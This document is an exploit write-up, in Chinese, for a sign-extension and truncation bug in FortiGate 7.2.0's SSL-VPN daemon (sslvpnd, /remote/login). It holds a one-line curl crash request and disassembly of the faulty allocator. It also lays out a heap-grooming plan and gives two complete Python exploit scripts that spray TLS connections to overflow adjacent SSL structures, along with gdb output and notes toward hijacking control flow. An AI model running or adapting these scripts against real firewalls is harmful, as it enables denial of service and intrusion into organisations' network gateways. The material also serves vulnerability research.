# 环境

FGT: 7.2.0

CPU: 4

# poc

```
diagnose debug crashlog read
```

```
curl -v --insecure -H "Content-Length: 2147483647" --data 1 https://192.168.182.188:8443/remote/login
```

崩溃输出：

```
2303: 2024-12-01 22:56:53 <00223> firmware FortiGate-VM64-KVM v7.2.0,build1157b1157,220331 (GA.F) 
2304: 2024-12-01 22:56:53 (Release)
2305: 2024-12-01 22:56:53 <00223> application sslvpnd
2306: 2024-12-01 22:56:53 <00223> *** signal 11 (Segmentation fault) received ***
2307: 2024-12-01 22:56:53 <00223> Register dump:
2308: 2024-12-01 22:56:53 <00223> RAX: 00007f337d36a7c8   RBX: ffffffff80000000
2309: 2024-12-01 22:56:53 <00223> RCX: 00007f337d36a800   RDX: ffffffff80000000
2310: 2024-12-01 22:56:53 <00223> R08: 00007f337d36a7c8   R09: 0000000000000000
2311: 2024-12-01 22:56:53 <00223> R10: 0000000000000000   R11: 0000000000000246
2312: 2024-12-01 22:56:53 <00223> R12: ffffffff80000000   R13: 00007f337d369400
2313: 2024-12-01 22:56:53 <00223> R14: 00007f337d3e6b08   R15: 0000000000000000
2314: 2024-12-01 22:56:53 <00223> RSI: 0000000000000000   RDI: 00007f337d36a7c8
2315: 2024-12-01 22:56:53 <00223> RBP: 00007fff29416940   RSP: 00007fff29416918
2316: 2024-12-01 22:56:53 <00223> RIP: 00007f3383327b30   EFLAGS: 0000000000010206
2317: 2024-12-01 22:56:53 <00223> CS:  0033   FS: 0000   GS: 0000
2318: 2024-12-01 22:56:53 <00223> Trap: 000000000000000e   Error: 0000000000000006
2319: 2024-12-01 22:56:53 <00223> OldMask: 0000000000000000
2320: 2024-12-01 22:56:53 <00223> CR2: 00007f32fd36a7b8
2321: 2024-12-01 22:56:53 <00223> stack: 0x7fff29416918 - 0x7fff29419890 
2322: 2024-12-01 22:56:53 <00223> Backtrace:
2323: 2024-12-01 22:56:53 <00223> [0x7f3383327b30] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
2324: 2024-12-01 22:56:53 000a4b30
2325: 2024-12-01 22:56:53 <00223> [0x015f14eb] => /bin/sslvpnd  
2326: 2024-12-01 22:56:53 <00223> [0x0171a602] => /bin/sslvpnd  
2327: 2024-12-01 22:56:53 <00223> [0x01713ad5] => /bin/sslvpnd  
2328: 2024-12-01 22:56:53 <00223> [0x017152a0] => /bin/sslvpnd  
2329: 2024-12-01 22:56:53 <00223> [0x0171537e] => /bin/sslvpnd  
2330: 2024-12-01 22:56:53 <00223> [0x01715b91] => /bin/sslvpnd  
2331: 2024-12-01 22:56:53 <00223> [0x01716f42] => /bin/sslvpnd  
2332: 2024-12-01 22:56:53 <00223> [0x01717236] => /bin/sslvpnd  
2333: 2024-12-01 22:56:53 <00223> [0x01717919] => /bin/sslvpnd  
2334: 2024-12-01 22:56:53 <00223> [0x0044c88f] => /bin/sslvpnd  
2335: 2024-12-01 22:56:53 <00223> [0x004554ca] => /bin/sslvpnd  
2336: 2024-12-01 22:56:53 <00223> [0x0045212c] => /bin/sslvpnd  
2337: 2024-12-01 22:56:53 <00223> [0x00454738] => /bin/sslvpnd  
2338: 2024-12-01 22:56:53 <00223> [0x00455061] => /bin/sslvpnd  
2339: 2024-12-01 22:56:53 <00223> [0x7f33832a6deb] => /usr/lib/x86_64-linux-gnu/libc.so.6 
2340: 2024-12-01 22:56:53 (__libc_start_main+0x000000eb) liboffset 00023deb
2341: 2024-12-01 22:56:53 <00223> [0x00447daa] => /bin/sslvpnd  
2342: 2024-12-01 22:56:53 <00223> fortidev 6.0.1.0005
Crash log interval is 3600 seconds
sslvpnd crashed 1 times. The last crash was at 2024-12-01 22:56:53
Max crash log line number: 16384
```

崩溃点为read_post_data函数（sub_171A510）---> sub_15F14A0 ---> 00000000015F14E6 memset

通过崩溃信息，memset的参数分别为：

```
void *memset(void *s, int c, size_t n);
s == $rdi == 00007f337d36a7c8
c == $rsi == 0000000000000000
n == $rdx == ffffffff80000000
```

read_post_data 函数逻辑为：将Content-Length+1 ， 然后调用sub_15F14A0分配内存，然后读取数据

在给  sub_15F14A0 传递 Content-Length+1 时，存在符号扩展：

```
.text:000000000171A5F0                 mov     eax, [rax+18h] # content-length
.text:000000000171A5F3                 mov     rdi, [r12]
.text:000000000171A5F7                 lea     esi, [rax+1]
.text:000000000171A5FA                 movsxd  rsi, esi
.text:000000000171A5FD                 call    sub_15F14A0
```

当我们的content-length 为 0x7FFFFFFF 时，Content-Length+1 为 0x80000000，movsxd  rsi, esi 导致传递给sub_15F14A0函数的第二个参数的寄存器rsi值为（也就是分配内存的大小）：0xFFFFFFFF80000000。



sub_15F14A0 为实际的内存分配函数：

```c
void *__fastcall sub_15F14A0(__int64 a1, size_t a2)
{
  _QWORD *v2; // rax
  char *v3; // r8
  unsigned __int64 v4; // rbx
  unsigned __int64 v6; // r14
  _QWORD *v7; // rax

  v2 = *(_QWORD **)(a1 + 8);
  v3 = (char *)v2[2];
  if ( a2 )
  {
    v4 = 8LL * (int)(((a2 - 1) >> 3) + 1);
    if ( (unsigned __int64)&v3[v4] > *v2 )
    {
      v6 = dword_A782904 - 25;
      if ( v6 < v4 )
        v6 = 8LL * (int)(((a2 - 1) >> 3) + 1);
      v7 = (_QWORD *)je_malloc(v6 + 24);
      if ( !v7 )
        sub_15F3F90();
      v7[1] = 0LL;
      v7[2] = v7 + 3;
      *v7 = (char *)v7 + v6 + 24;
      *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8LL) = v7;
      v3 = (char *)v7[2];
      *(_QWORD *)(a1 + 8) = v7;
      v7[2] = &v3[v4];
    }
    else
    {
      v2[2] = &v3[v4];
    }
  }
  else
  {
    v3 = 0LL;
  }
  return memset(v3, 0, a2);
}
```

sub_15F14A0 对应的逻辑为：

```c
struct pool
{
	struct heapChunk* info;
}

struct heapChunk
{
	int64_t endOfAllocation;
	heapChunk* previousChunk;
	void* nextFreeSpace;
	char data[];
}

char* sslvpn_ap_pcalloc(pool* myPool, int64_t requestedSize)
{
  char* result = NULL;
  if ( requestedSize > 0 )
  {
    // Align the requested size up to the nearest 8 bytes
    uint64_t alignedSize = (((requestedSize - 1) / 8 ) + 1) * 8;
    
    // Is there enough space left in the current pool chunk?
    if ( &info->nextFreeSpace[alignedSize] > endOfAllocation )
    {
      // There is not enough space left. We must allocate a new chunk.
      chunkSize = global_sizeOfNewChunks;
      if ( chunkSize < alignedSize )
        chunkSize = alignedSize;
        
      // Allocate our new pool chunk, which will hold multiple allocations
      chunkInfo* newChunk = malloc_block(chunkSize);

      // Link this new chunk into our list of chunks
      myPool->info->previousChunk = newChunk;
      myPool->info = newChunk;
      
      // Now we can allocate from our new pool chunk.
      result = myPool->info->nextFreeSpace;
      myPool->info->nextFreeSpace = &result[alignedSize];
    }
    else
    {
      result = myPool->info->nextFreeSpace;
      myPool->info->nextFreeSpace += alignedSize;
    }
  }
  return memset(result, 0, requestedSize);
}
```

sslvpn_ap_pcalloc 函数通常被称为pool分配器 - 它不是简单地从底层内存管理器（如malloc）分配内存，而是通过分配大量内存来尝试最小化堆碎片化和分配次数。

可以看到该函数接受一个pool*参数，该参数包含先前内存分配的相关信息。

例如，对 sslvpn_ap_pcalloc 的第一次调用可能请求的大小为 0x10。为了处理这个请求，sslvpn_ap_pcalloc 会分配一个更大的块（global_sizeOfNewChunks，大约 0x400 字节）。将此分配记录在池中，然后返回新分配的块的开头地址给调用者。然而，在下次调用 sslvpn_ap_pcalloc 时，将检查此池缓冲区，如果它有足够的空闲空间，则函数将返回池中的缓冲区，而不是需要再次调用 malloc。

当我们的requestedSize 参数为负数时，也就是0xFFFFFFFF80000000时，

```c
if ( &info->nextFreeSpace[alignedSize] > endOfAllocation )
```

将始终为false，也就是假设我们还有足够空闲的空间，会执行：

```c
result = myPool->info->nextFreeSpace;
myPool->info->nextFreeSpace += alignedSize;
return memset(result, 0, requestedSize);
```

这就是崩溃的原因。

# exp

```
.text:000000000171A5F0                 mov     eax, [rax+18h] # content-length
.text:000000000171A5F3                 mov     rdi, [r12]
.text:000000000171A5F7                 lea     esi, [rax+1]
.text:000000000171A5FA                 movsxd  rsi, esi
.text:000000000171A5FD                 call    sub_15F14A0
```

当content-length的值大于4个字节的大小时，如：0x1 0000 0000时，

```
 mov     eax, [rax+18h] 
```

会进行4字节截断，eax的值此时为0，

```
lea     esi, [rax+1]
```

会使，esi 为 1，使得后续内存分配1字节大小（并不一定会分配，可能会从上一次分配的大内存块中直接返回一部分，参见上一节的sslvpn_ap_pcalloc函数）。

后续读取时，仍然会读取[rax+18h] # content-length的大小，从而造成堆溢出。

### 风水

仍然需要考虑到 sslvpnd 进程与 CPU之间的关系

首先分配大量的ssl结构体，然后在溢出ssl结构体中的handshake_func函数。

对于4个CPU的FGT设备，实际进行处理的3个进程中的ssl结构体编号为：

假设sslvpnd0中的ssl结构体编号为：0，3，6，9

假设sslvpnd1中的ssl结构体编号为：1，4，7，10

假设sslvpnd2中的ssl结构体编号为：2，5，8，11



顺序释放，8，7，6，5，4，3，然后通过read_post_data分配内存对其进行占用（触发read_post_data函数，也需要创建ssl结构体，我们需要使该SSL结构体的编号为3，4，5，后续read_post_data分配的地址为6，7，8），溢出后续的9，10，11



对于FGT 7.2.0 SSL结构体的大小为0x1888 , jemalloc 会为其分配7kb的内存，我们也需要保证read_post_data 会为其分配到7kb的内存，那么对于content-length 的低四字节，我们需要设置为：(((7KB-24)>>3)-1)<<3  == 7136 == 0x1BE0  (减去24是因为jemalloc时，会对其加24，通过函数sub_15F14A0可以知道的)

```python
#!/usr/bin/python3
from pwn import *
import threading
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib
import math
import random
import string
import struct
import subprocess

SSLVPND_WORKER_COUNT = 3
PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT = 51
SSL_STRUCT_SIZE = 0x1c00
CONTENT_LEN = (((SSL_STRUCT_SIZE-24)>>3)-1)<<3
HOST = "192.168.182.188"
PORT = 8443  

REQ_POST = """\
POST %s HTTP/1.1\r
Host: %s:%d\r
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r
Content-Type: text/plain;charset=UTF-8\r
Connection: keep-alive\r
Content-Length: %d\r
\r
%s
"""

REQ_GET = """\
GET %s HTTP/1.1\r
Host: %s:%d\r
Connection: keep-alive\r
\r
"""

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

def try_read_response(sock) -> bytes:
    """Try to read the response header and contents. If the read() call
    returns an empty byte array, `RuntimeError` is raised. This generally
    indicates that the socket died.
    """

    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError(f"Unable to read response headers: {headers}")
        return read

    count = 0
    max_count = 10
    while not (headers := sock.read(1)):
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError(f"Unable to read response headers: {headers}")

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    # TOP tier HTTP parser
    if b"Content-Length: " in headers:
        length = int(re.search(rb"Content-Length: ([0-9]+)", headers).group(1))
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while len(data) < length:
            data += read_or_raise(length - len(data))
    elif b"Transfer-Encoding: chunked" in headers:
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while not data.endswith(b"\r\n0\r\n\r\n"):
            data += read_or_raise(100)
    else:
        raise RuntimeError(
            f"No Content-Length / Transfer-Encoding headers: {headers}"
        )
    return data

def send_post(sock, path: str, data , content_len) -> bytes:
    """Sends a POST request"""
    if len(data) > 0x10000:
        failure(f"POST data too big: {hex(len(data))}")
    request = REQ_POST % (path, HOST, PORT, content_len, data)
    sock.sendall(request.encode())

def send_get(sock, path: str) -> bytes:
    """Sends a GET request, returns the response."""
    request = REQ_GET % (
            path,
            HOST,
            PORT,
    )
    sock.sendall(request.encode())
    return try_read_response(sock)

def attack(sock):
    send_post(sock,"/remote/login","AAA",CONTENT_LEN)
    
socks = []
for i in range(SSLVPND_WORKER_COUNT*PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT):
    sk = create_ssl_socket()
    socks.append(sk)

close_socks_index = (PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT//2)*SSLVPND_WORKER_COUNT
close_socks = []
for i in range(close_socks_index,close_socks_index + SSLVPND_WORKER_COUNT*2):
    close_socks.insert(0,socks[i])

victim_socks = []
for i in range(close_socks_index + SSLVPND_WORKER_COUNT*2,close_socks_index + SSLVPND_WORKER_COUNT*3):
    victim_socks.append(socks[i])

for sk in close_socks:
    sk.close()

attack_socks = []
for i in range(SSLVPND_WORKER_COUNT):
    sk = create_ssl_socket()
    attack_socks.append(sk)

attack_sock_threads = []
for i in range(SSLVPND_WORKER_COUNT):
    thread = threading.Thread(target=attack,args=(attack_socks[i],))
    attack_sock_threads.append(thread)
    thread.start()

for thread in attack_sock_threads:
    thread.join()
```



gdb监控脚本：

```
handle SIGPIPE nostop

break *SSL_new + 0x35
commands
	printf "ssl alloc addr:%p\n",$rax 
	continue
end

b *0x000000000171A602 
commands
	printf "read_post_data alloc addr:%p\n",$rax
	continue
end
```

输出：

```
Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d416000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d417c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4c4000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4c7800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4c9400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf0a000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf12c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf14800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d419800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d41b400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4c5c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf0bc00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf0d800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf0f400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf11000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337bf16400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d43e000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d43fc00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d441800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d443400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d48b000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d48cc00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d48e800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d490400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d492000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d493c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d495800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d497400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4e7000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4e8c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4ea800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d4ec400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d527000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d528c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d52a800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d52c400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d52e000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d52fc00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d531800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d533400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d573000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d574c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d576800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d578400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d5a8000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d5a9c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d5ab800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d5ad400

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d5af000

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d5b0c00

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d5b2800

Breakpoint 1, 0x00007f3382cf5935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
alloc ssl struct addr:0x7f337d493c00

Breakpoint 2, 0x000000000171a602 in ?? ()
read_post_data alloc addr:0x7f337d495818
```

attack_sock 的SSL 结构体地址为0x7f337d493c00，read_post_data分配的地址为（0x7f337d495818 ， +0x18通过逆向sub_15F14A0函数可以知道原因）,victim_sock的SSL 结构体为0x7f337d497400，此时已经完成了我们的内存布局。

### control rip

由于该漏洞的特性，不能像CVE-2023-27997那样对SSL结构体中的handshake_func函数指针直接进行修改，而不影响该字段的前面部分。

如果我们通过该漏洞直接写handshake_func，会对SSL结构体的该字段的前面部分的字段造成破坏。特别是const SSL_METHOD *method;字段

如获取s->method->ssl_shutdown 造成崩溃：

```
(gdb) x /16xg 0x7f9fc9caec00
0x7f9fc9caec00:	0x4141414141414141	0x4141414141414141
0x7f9fc9caec10:	0x4141414141414141	0x4141414141414141
0x7f9fc9caec20:	0x4141414141414141	0x4141414141414141
0x7f9fc9caec30:	0x4141414141414141	0x4141414141414141
0x7f9fc9caec40:	0x4141414141414141	0x4141414141414141
0x7f9fc9caec50:	0x4141414141414141	0x000a414141414141
0x7f9fc9caec60:	0x0000000000000000	0x0000000000000000
0x7f9fc9caec70:	0x0000000000000000	0x0000000000000000
(gdb) set disassembly-flavor intel 
(gdb) x /10i $rip                  
=> 0x7f9fcf4814f0 <SSL_shutdown+80>:	mov    rax,QWORD PTR [rax+0x50]
   0x7f9fcf4814f4 <SSL_shutdown+84>:	add    rsp,0x30
   0x7f9fcf4814f8 <SSL_shutdown+88>:	pop    rbp
   0x7f9fcf4814f9 <SSL_shutdown+89>:	jmp    rax
   0x7f9fcf4814fb <SSL_shutdown+91>:	nop    DWORD PTR [rax+rax*1+0x0]
   0x7f9fcf481500 <SSL_shutdown+96>:	call   0x7f9fcf463440 <ASYNC_get_current_job@plt>
   0x7f9fcf481505 <SSL_shutdown+101>:	test   rax,rax
   0x7f9fcf481508 <SSL_shutdown+104>:	jne    0x7f9fcf4814d5 <SSL_shutdown+53>
   0x7f9fcf48150a <SSL_shutdown+106>:	mov    rax,QWORD PTR [rbp+0x8]
   0x7f9fcf48150e <SSL_shutdown+110>:	mov    rsi,rsp
(gdb) info registers 
rax            0x4141414141414141  4702111234474983745
rbx            0x7f9fc9cf3000      140324262326272
rcx            0x7f9fcb2eea68      140324285377128
rdx            0x7f9fca806210      140324273938960
rsi            0x7f9fd0518240      140324371530304
rdi            0x7f9fc9caec00      140324262046720
rbp            0x7f9fc9caec00      0x7f9fc9caec00
rsp            0x7fff9f4a7770      0x7fff9f4a7770
r8             0x70                112
r9             0x0                 0
r10            0x2000              8192
r11            0x60                96
r12            0x7f9fc9cf3000      140324262326272
r13            0x0                 0
r14            0x1                 1
r15            0x7f9fc9d04de0      140324262399456
rip            0x7f9fcf4814f0      0x7f9fcf4814f0 <SSL_shutdown+80>
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7f9fcb2effc0      140324285382592
gs_base        0x0                 0

```

### 思路1

是否可以尝试将s->method 的 低字节设置为特定的值，然后通过read_post_data分配一块大内存，使得s->method指向我们分配的内存呢？

```python
#!/usr/bin/python3
from pwn import *
import threading
import http.client
import ssl
import socket
import re
import urllib.parse
import time
import hashlib
import math
import random
import string
import struct
import subprocess

SSLVPND_WORKER_COUNT = 3
PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT = 51
SSL_STRUCT_SIZE = 0x1c00
CONTENT_LEN = (((SSL_STRUCT_SIZE-24)>>3)-1)<<3
HOST = "192.168.182.188"
PORT = 8443  

REQ_POST = """\
POST %s HTTP/1.1\r
Host: %s:%d\r
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r
Content-Type: text/plain;charset=UTF-8\r
Connection: keep-alive\r
Content-Length: %d\r
\r
%s
"""

REQ_GET = """\
GET %s HTTP/1.1\r
Host: %s:%d\r
Connection: keep-alive\r
\r
"""

CIPHERS = "ECDHE-RSA-AES256-SHA@SECLEVEL=0"
context = ssl.create_default_context()
context.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
context.set_ciphers(CIPHERS)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

def create_ssl_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    ssl_sock = context.wrap_socket(sock)
    return ssl_sock

def try_read_response(sock) -> bytes:
    """Try to read the response header and contents. If the read() call
    returns an empty byte array, `RuntimeError` is raised. This generally
    indicates that the socket died.
    """

    def read_or_raise(n):
        read = sock.read(n)
        if not read:
            raise RuntimeError(f"Unable to read response headers: {headers}")
        return read

    count = 0
    max_count = 10
    while not (headers := sock.read(1)):
        count += 1
        time.sleep(0.1)
        if count == max_count:
            raise RuntimeError(f"Unable to read response headers: {headers}")

    while b"\r\n\r\n" not in headers:
        headers += read_or_raise(100)

    # TOP tier HTTP parser
    if b"Content-Length: " in headers:
        length = int(re.search(rb"Content-Length: ([0-9]+)", headers).group(1))
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while len(data) < length:
            data += read_or_raise(length - len(data))
    elif b"Transfer-Encoding: chunked" in headers:
        data = headers[headers.index(b"\r\n\r\n") + 4 :]
        while not data.endswith(b"\r\n0\r\n\r\n"):
            data += read_or_raise(100)
    else:
        raise RuntimeError(
            f"No Content-Length / Transfer-Encoding headers: {headers}"
        )
    return data

def send_post(sock, path: str, data , content_len) -> bytes:
    """Sends a POST request"""
    if len(data) > 0x10000:
        failure(f"POST data too big: {hex(len(data))}")
    request = REQ_POST % (path, HOST, PORT, content_len, data)
    sock.sendall(request.encode())

def send_get(sock, path: str) -> bytes:
    """Sends a GET request, returns the response."""
    request = REQ_GET % (
            path,
            HOST,
            PORT,
    )
    sock.sendall(request.encode())
    return try_read_response(sock)

def attack(sock):
    send_post(sock,"/remote/login","A"*(CONTENT_LEN),CONTENT_LEN)

def generate_random_string(length):
    characters = string.ascii_letters + string.punctuation  # 包含字母和标点符号
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string
def trigger(sock):
    random_str = generate_random_string(16)
    try:
        send_get(sock, f"/remote/error?errmsg={random_str}")
    except RuntimeError as e:
        return
    return 

socks = []
for i in range(SSLVPND_WORKER_COUNT*PER_SSLVPND_SSL_STRUCT_ALLOC_COUNT):
    sk = create_ssl_socket()
    socks.append(sk)

for sk in socks:
    attack(sk)

```



```
handle SIGPIPE nostop

break *SSL_new + 0x35
commands
	printf "ssl alloc addr:%p\n",$rax 
	continue
end

b *0x000000000171A602 
commands
	printf "read_post_data alloc addr:%p\n",$rax
	continue
end

b *SSL_new + 0x44D  
commands
	printf "s->method addr:%p\n",$rax
	continue
end
```

```
........................................
Breakpoint 1, 0x00007f9fcf485935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f9fc8027000

Breakpoint 3, 0x00007f9fcf485d4d in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
s->method addr:0x7f9fcf4d69e0

Breakpoint 1, 0x00007f9fcf485935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f9fc8028c00

Breakpoint 3, 0x00007f9fcf485d4d in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
s->method addr:0x7f9fcf4d69e0

Breakpoint 1, 0x00007f9fcf485935 in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
ssl alloc addr:0x7f9fc802a800

Breakpoint 3, 0x00007f9fcf485d4d in SSL_new () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
s->method addr:0x7f9fcf4d69e0

Breakpoint 2, 0x000000000171a602 in ?? ()
read_post_data alloc addr:0x7f9fc802c418

Breakpoint 2, 0x000000000171a602 in ?? ()
read_post_data alloc addr:0x7f9fc8033418

......................................


